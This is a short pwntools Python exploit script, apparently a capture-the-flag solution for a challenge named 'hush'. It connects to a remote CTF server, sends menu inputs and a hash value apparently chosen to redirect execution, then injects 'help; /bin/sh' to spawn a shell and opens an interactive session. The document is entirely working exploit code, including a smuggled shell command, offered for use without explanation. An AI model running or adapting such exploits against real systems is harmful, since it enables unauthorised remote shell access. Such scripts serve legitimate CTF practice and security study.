#!/usr/bin/env python3

from pwn import *

#target = process('../../challs/hush/hush')
#target = remote('127.0.0.1', 9999)
target = remote('binarytohack.thsctf.site', 57411)

hashed_values = [
        b'f855a80240000000', # hash ending: 004014bf
        b'c90a5b03c0000000', # hash ending: 004014d7
        b'95b0a00880000000', # hash ending: 004014a5
        b'a3f7191d00000000', # hash ending: 004014b5
]

target.sendlineafter(b'> ', b'1')
target.sendlineafter(b'> ', b'SHA224')
target.sendlineafter(b'> ', b'0')
target.sendlineafter(b'> ', hashed_values[2])
target.sendline(b'help; /bin/sh')

target.interactive()

